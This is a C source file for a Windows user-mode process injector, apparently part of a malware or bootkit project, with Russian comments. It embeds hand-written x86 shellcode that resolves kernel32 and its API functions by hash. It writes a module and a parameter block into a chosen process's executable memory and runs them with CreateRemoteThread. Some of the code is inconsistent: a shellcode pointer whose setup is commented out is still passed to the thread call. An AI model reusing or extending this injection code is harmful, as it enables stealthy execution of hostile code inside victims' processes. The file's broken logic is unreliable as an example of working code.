#include <stdio.h>
#include <windows.h>
#include <tchar.h>

// #ifdef _WIN64
// #include "../../driver/code/shellcode/sc64.c"
// #else
// #include "../../mod_launcher/code/shellcodes/zexesc32.c"
// #endif

#include "calc.h"

#pragma pack(push, 1)

typedef struct _shellcode_block
{
    UINT8* ntdllBase;
    UINT8* kernel32Base;
    void* fnLoadLibraryA;
    void* fnGetProcAddress;
    ULONG dataSize;									// Размер данных для шеллкода.
    UINT8 data[1];									// Данные специфические для шеллкода.
} shellcode_block_t, *pshellcode_block_t;

// Структура для передачи параметров ring3-шеллкоду, который отвечает за окончательный инжект DLL.
typedef struct _zfile_wrapper_info
{
    UINT8 installKey[48];
    UINT8 bootKey[48];
    UINT8 fsKey[48];
    UINT32 flags;         // Управляющие флаги.
    UINT8* moduleBuffer;  // База DLL или адрес буфера EXE файла или шеллкода.
    UINT32 moduleSize;    // Размер буфера с модулем.
    UINT8* fnVirtualFree;
    UINT8* fnCreateProcessW;
    UINT8* fnGetEnvironmentVariableW;
    UINT8* fnCreateFileW;
    UINT8* fnWriteFile;
    UINT8* fnCloseHandle;
} zfile_wrapper_info_t, *pshellcode_wrapper_info_t;

#pragma pack(pop)

UCHAR sc_kernel32_finder_x32[103] = {
    0x51,0x53,0x57,0x33,0xDB,0x64,0xA1,0x30,0x00,0x00,0x00,0x89,0x44,0x24,0x08,0x8B,
    0x44,0x24,0x08,0x8B,0x40,0x0C,0x8B,0x78,0x14,0x8B,0xD7,0x85,0xFF,0x74,0x42,0x55,
    0x56,0x8D,0x42,0x24,0x85,0xC0,0x74,0x2C,0x0F,0xB7,0x08,0x8B,0x40,0x04,0x33,0xF6,
    0x66,0x85,0xC9,0x76,0x1F,0x0F,0xB6,0x28,0x83,0xCD,0x20,0xC1,0xCE,0x0B,0x03,0xF5,
    0x81,0xC1,0xFF,0xFF,0x00,0x00,0x40,0x66,0x85,0xC9,0x77,0xE9,0x81,0xFE,0x02,0x9D,
    0xAA,0xC4,0x74,0x08,0x8B,0x12,0x3B,0xD7,0x75,0xC7,0xEB,0x03,0x8B,0x5A,0x10,0x5E,
    0x5D,0x5F,0x8B,0xC3,0x5B,0x59,0xC3};  

UCHAR sc_export_finder_x32[139] = {
    0x55,0x8B,0xEC,0x51,0x51,0x56,0x8B,0x75,0x08,0x8B,0x4E,0x3C,0x8B,0x4C,0x31,0x78,
    0x33,0xC0,0x03,0xCE,0x89,0x45,0xF8,0x74,0x6C,0x8B,0x51,0x20,0x21,0x45,0x08,0x57,
    0x8B,0x79,0x18,0x03,0xD6,0x85,0xFF,0x76,0x5B,0x53,0x8B,0x3A,0x03,0xFE,0x74,0x2A,
    0x8A,0x1F,0x83,0x65,0xFC,0x00,0x84,0xDB,0x74,0x18,0x8B,0x45,0xFC,0x0F,0xB6,0xDB,
    0xC1,0xC8,0x0B,0x03,0xC3,0x47,0x8A,0x1F,0x89,0x45,0xFC,0x84,0xDB,0x75,0xEB,0x8B,
    0x45,0xF8,0x8B,0x7D,0xFC,0x3B,0x7D,0x0C,0x74,0x10,0x83,0xC2,0x04,0xFF,0x45,0x08,
    0x8B,0x7D,0x08,0x3B,0x79,0x18,0x72,0xC2,0xEB,0x19,0x0F,0xB7,0x45,0x08,0x8B,0x51,
    0x24,0x8B,0x49,0x1C,0x8D,0x04,0x42,0x0F,0xB7,0x04,0x30,0x8D,0x04,0x81,0x8B,0x04,
    0x30,0x03,0xC6,0x5B,0x5F,0x5E,0xC9,0xC2,0x08,0x00,0x00}; 

int main(int argc, char** argv)
{
    PIMAGE_DOS_HEADER dosHdr;
    PIMAGE_NT_HEADERS ntHdrs;
    HANDLE hProcess = NULL;
    DWORD processId = 0, threadId = 0;
	DWORD RValue;
	pshellcode_block_t scb;
    zfile_wrapper_info_t wrapInfo;
    unsigned char *newBase = NULL;
    HANDLE hThread = NULL;
    PUCHAR pShellcodeBlock;
    PUCHAR pShellcode;
    PUCHAR kernel32Base = NULL;
    PUCHAR fnSetEvent;
// #ifdef _WIN64
//     void* (*Shellcode1)();
//     Shellcode1  = (void*(*)())(PVOID)&sc_kernel32_finder_x32;
// #else
	void* (__stdcall *FnGetFuncAddress)(PUCHAR moduleBase, UINT32 hashVal);
    void* (__stdcall *Shellcode1)();

    STARTUPINFO stInfo;
    PROCESS_INFORMATION pcInfo;

    __stosb((unsigned char*)&stInfo, 0, sizeof(STARTUPINFO));
    stInfo.cb = sizeof(STARTUPINFO);
    CreateProcessW(L"c:\\windows\\system32\\calc.exe", NULL, NULL, NULL, TRUE, 0x00000020/*NORMAL_PRIORITY_CLASS*/, NULL, NULL, &stInfo, &pcInfo);

    FnGetFuncAddress  = (void*(__stdcall *)())(PVOID)sc_export_finder_x32;
    Shellcode1  = (void*(__stdcall *)())(PVOID)sc_kernel32_finder_x32;
// #endif

    VirtualProtect(sc_kernel32_finder_x32, 4096, PAGE_EXECUTE_READWRITE, &RValue);
    VirtualProtect(sc_export_finder_x32, 4096, PAGE_EXECUTE_READWRITE, &RValue);


    kernel32Base = Shellcode1();

    if ((fnSetEvent = FnGetFuncAddress(kernel32Base, 0x54AA7CC8)) == NULL) {
        return;
    }
//     wchar_t buffer[1024];
// 
//     GetEnvironmentVariableW(L"temp", buffer, 1024);
// 
//     wprintf(buffer);
//     return 0;
// #ifdef _WIN64
// 	void (*Shellcode)(pshellcode_block_t);
// 	Shellcode  = (void(*)(pshellcode_block_t))(PVOID)&bin_data1;
// #else
// 	void (__stdcall *Shellcode)(pshellcode_block_t);
// 	Shellcode  = (void(__stdcall *)(pshellcode_block_t))(PVOID)&bin_data1;
// #endif
// 
// 	VirtualProtect(&bin_data1, 4096, PAGE_EXECUTE_READWRITE, &RValue);
// 
// 	scb = (pshellcode_block_t)malloc(sizeof(shellcode_block_t) + 4096);
//     memset(scb, 0, sizeof(shellcode_block_t) + 4096);
// 	scb->ntdllBase = (PUCHAR)GetModuleHandleA("ntdll.dll");
// 	scb->kernel32Base = (PUCHAR)GetModuleHandleA("kernel32.dll");
// 	scb->fnGetProcAddress = GetProcAddress(scb->kernel32Base, "GetProcAddress");
// 	scb->fnLoadLibraryA = GetProcAddress(scb->kernel32Base, "LoadLibraryA");
// 
//     strcpy(wrapInfo.installKey, "SHLWAPI.DLL");
//     wrapInfo.flags = 1;
//     wrapInfo.moduleBuffer = bin_calc;
//     wrapInfo.moduleSize = sizeof(bin_calc);
//     wrapInfo.fnCreateProcessW = (UINT8*)GetProcAddress(scb->kernel32Base, "CreateProcessW");
//     wrapInfo.fnGetEnvironmentVariableW = (UINT8*)GetProcAddress(scb->kernel32Base, "GetEnvironmentVariableW");
//     wrapInfo.fnCreateFileW = (UINT8*)GetProcAddress(scb->kernel32Base, "CreateFileW");
//     wrapInfo.fnWriteFile = (UINT8*)GetProcAddress(scb->kernel32Base, "WriteFile");
//     wrapInfo.fnCloseHandle = (UINT8*)GetProcAddress(scb->kernel32Base, "CloseHandle");
//     wrapInfo.fnVirtualFree = (UINT8*)GetProcAddress(scb->kernel32Base, "VirtualFree");
//     
//     memcpy(scb->data, &wrapInfo, sizeof(zfile_wrapper_info_t));
//     wcscpy(scb->data + sizeof(zfile_wrapper_info_t), L"f2gd2837gd.exe");
//     scb->dataSize = 4096;
// 	
// 	Shellcode(scb);



//     getch();

    do {
        if (argc < 2) {
            printf("ring3_injector.exe <pid>\n");
            break;;
        }

        processId = atoi(argv[1]);

        if (processId != 0) {
            hProcess = OpenProcess(PROCESS_CREATE_THREAD|PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_VM_READ, FALSE, processId);
            if (hProcess == NULL) {
                printf("Failed to open the target process\n");
                break;
            }
        }

//         dosHdr = (PIMAGE_DOS_HEADER)dll_data;
//         if (dosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
//             break;
//         }
// 
//         ntHdrs = (PIMAGE_NT_HEADERS)(dll_data + dosHdr->e_lfanew);
//         if (ntHdrs->Signature != IMAGE_NT_SIGNATURE) {
//             break;
//         }
// 
        // Выделяем память в целевом процессе для нашей DLL
//         pShellcode = (unsigned char*)VirtualAllocEx(hProcess, NULL, sizeof(bin_data1), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
// 
//         if (pShellcode == NULL) {
//             break;
//         }
// 
//         if (!WriteProcessMemory(hProcess, pShellcode, bin_data1, sizeof(bin_data1), NULL)) {
//             break;
//         }
//             

            // Выделяем память в целевом процессе для нашей DLL
            newBase = (unsigned char*)VirtualAllocEx(hProcess, NULL, sizeof(bin_calc), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            if (newBase == NULL) {
                break;
            }

//        if (processId != 0) {
            // ЗАписываем нашу DLL в память целевого процесса.
            if (!WriteProcessMemory(hProcess, newBase, bin_calc, sizeof(bin_calc), NULL)) {
                break;
            }

            scb = (pshellcode_block_t)malloc(sizeof(shellcode_block_t) + 4096);
            memset(scb, 0, sizeof(shellcode_block_t) + 4096);
            scb->ntdllBase = (PUCHAR)GetModuleHandleA("ntdll.dll");
            scb->kernel32Base = (PUCHAR)GetModuleHandleA("kernel32.dll");
            scb->fnGetProcAddress = GetProcAddress(scb->kernel32Base, "GetProcAddress");
            scb->fnLoadLibraryA = GetProcAddress(scb->kernel32Base, "LoadLibraryA");

            strcpy(wrapInfo.installKey, "SHLWAPI.DLL");
            wrapInfo.flags = 1;
            wrapInfo.moduleBuffer = newBase;
            wrapInfo.moduleSize = sizeof(bin_calc);
            wrapInfo.fnCreateProcessW = (UINT8*)GetProcAddress(scb->kernel32Base, "CreateProcessW");
            wrapInfo.fnGetEnvironmentVariableW = (UINT8*)GetProcAddress(scb->kernel32Base, "GetEnvironmentVariableW");
            wrapInfo.fnCreateFileW = (UINT8*)GetProcAddress(scb->kernel32Base, "CreateFileW");
            wrapInfo.fnWriteFile = (UINT8*)GetProcAddress(scb->kernel32Base, "WriteFile");
            wrapInfo.fnCloseHandle = (UINT8*)GetProcAddress(scb->kernel32Base, "CloseHandle");
            wrapInfo.fnVirtualFree = (UINT8*)GetProcAddress(scb->kernel32Base, "VirtualFree");

            memcpy(scb->data, &wrapInfo, sizeof(zfile_wrapper_info_t));
            wcscpy(scb->data + sizeof(zfile_wrapper_info_t), L"f2gd2837gd.exe");
            scb->dataSize = 4096;


            pShellcodeBlock = (BYTE*)VirtualAllocEx(hProcess, NULL, sizeof(shellcode_block_t) + 4096, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!WriteProcessMemory(hProcess, pShellcodeBlock, (LPCVOID)scb, sizeof(shellcode_block_t) + 4096, NULL)) {
                break;
            }

            hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, pShellcode, pShellcodeBlock, 0, &threadId);
//         }
//         else {
//             DllEntryProc pEntry;
//             BOOL successfull;
// 
//             dosHdr = (PIMAGE_DOS_HEADER)fakeBase;
//             ntHdrs = (PIMAGE_NT_HEADERS)(fakeBase + dosHdr->e_lfanew);
// 
//             if (ntHdrs->OptionalHeader.AddressOfEntryPoint != 0) {
//                 pEntry = (DllEntryProc)(fakeBase + ntHdrs->OptionalHeader.AddressOfEntryPoint);
// 
//                 // Передаём управление на точку входа.
//                 successfull = pEntry((HINSTANCE)fakeBase, DLL_PROCESS_ATTACH, NULL);
//             }
//         }

//        ret = EXIT_SUCCESS;
    } while (0);

    if (hProcess != NULL) {
        CloseHandle(hProcess);
    }

	return 0;
}
